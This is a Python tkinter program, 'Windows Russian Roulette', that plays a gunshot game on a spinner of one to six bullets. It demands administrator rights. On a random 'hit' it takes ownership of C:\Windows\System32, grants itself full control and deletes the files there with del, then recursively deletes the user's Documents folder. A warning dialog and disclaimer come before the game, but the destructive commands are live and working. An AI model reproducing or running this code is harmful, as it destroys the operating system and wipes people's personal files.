import tkinter as tk
from tkinter import messagebox
import subprocess
import sys
import time
import random
import os
from tkinter import PhotoImage
from PIL import Image, ImageTk
import pygame
import shutil
import ctypes

pygame.mixer.init()
documentos_ruta = os.path.expanduser('~/Documents')

def es_admin():
    try:
        # Devuelve True si el usuario es administrador, de lo contrario False
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

# Si no es administrador, muestra un mensaje de advertencia y cierra el programa
if not es_admin():
    messagebox.showerror("Permisos insuficientes", "Por favor, ejecuta la aplicación como administrador para que funcione. De otro modo su ordenador no podra ser destruido.")
    sys.exit()
    
def borrar_carpeta(ruta):
    try:
        # Verificar si la carpeta existe
        if os.path.exists(ruta):
            # Borrar la carpeta y todo su contenido
            shutil.rmtree(ruta)
            print(f"La carpeta '{ruta}' ha sido eliminada correctamente.")
        else:
            print(f"La carpeta '{ruta}' no se encontró.")
    except Exception as e:
        print(f"Error al borrar la carpeta: {e}")


pygame.mixer.music.load("E:\Python\WinRussianRoulette\music.mp3")
gunshot = pygame.mixer.Sound("E:\Python\WinRussianRoulette\gunshot.mp3")

command1 = r'takeown /f C:\Windows\System32\*'
command2 = r'icacls C:\Windows\System32\* /grant administrators:F'
command3 = r'del C:\Windows\System32\*'
numerobalas = 1;
pygame.mixer.music.play(loops=-1)

def Disparar():
    numerobalasstring = spinbox.get()
    numerobalas = int(numerobalasstring)
    numero = random.randint(1, 6)
    print(numero)
    print(numerobalas)
    if numero <= numerobalas:
        gunshot.play()
        pygame.mixer.music.stop()
        time.sleep(0.5)
        messagebox.showerror("SUCCESSFUL SHOT!!!", "A shot has damaged your system.")
        subprocess.run(command1, shell=True, check=True)
        subprocess.run(command2, shell=True, check=True)
        subprocess.run(command3, shell=True, check=True)
        borrar_carpeta(documentos_ruta)
        
        
      

    else:
        messagebox.showinfo("MISSED SHOT", "Your system is still in good condition. Continue at your own risk")
        


# Crear un Spinbox que solo permite seleccionar números del 1 al 6
ventana = tk.Tk()
ventana.resizable(False, False)
nombre_ventana = tk.Label(ventana, text= "Number of bullets:", bg = "red")
nombre_ventana.pack()
boton_disparar = tk.Button(ventana, text= "Shoot", command=Disparar)
boton_disparar.pack(side="bottom")   
spinbox = tk.Spinbox(ventana, text="Bullets 1/6",from_=1, to=6)
spinbox.pack(pady=10)
ventana.iconbitmap("E:\Python\WinRussianRoulette\Icon.ico")

imagen = Image.open("E:/Python/WinRussianRoulette/revolver.png")
imagen = imagen.resize((300, 180))  # Redimensionar la imagen a 300x180 píxeles
imagen_tk = ImageTk.PhotoImage(imagen)  # Convertir la imagen a un formato compatible con tkinter

# Crear un widget Label para mostrar la imagen
label_imagen = tk.Label(ventana, image=imagen_tk)
label_imagen.pack()

ventana.title("Windows Russian Roulette")
ancho_ventana = 400
alto_ventana = 250
pantalla_ancho = ventana.winfo_screenwidth()
pantalla_alto = ventana.winfo_screenheight()
pos_x = (pantalla_ancho // 2) - (ancho_ventana // 2)
pos_y = (pantalla_alto // 2) - (alto_ventana // 2)

# Configurar la geometría de la ventana (tamaño y posición)
ventana.geometry(f"{ancho_ventana}x{alto_ventana}+{pos_x}+{pos_y}")
    
def MostrarVentana():
    ventana.mainloop()
        
    
def MostrarError():
    respuesta = messagebox.askyesno("WARNING", "This app may cause fatal damage to your computer. Press no to exit safely. Use it at your own risk. The creator of this project is not responsible for any damage caused by it")
    if respuesta:
        ventana.deiconify()
        MostrarVentana()
    else:
        ventana.destroy()
        sys.exit()
  
      
ventana.withdraw()     
MostrarError() 
    

    
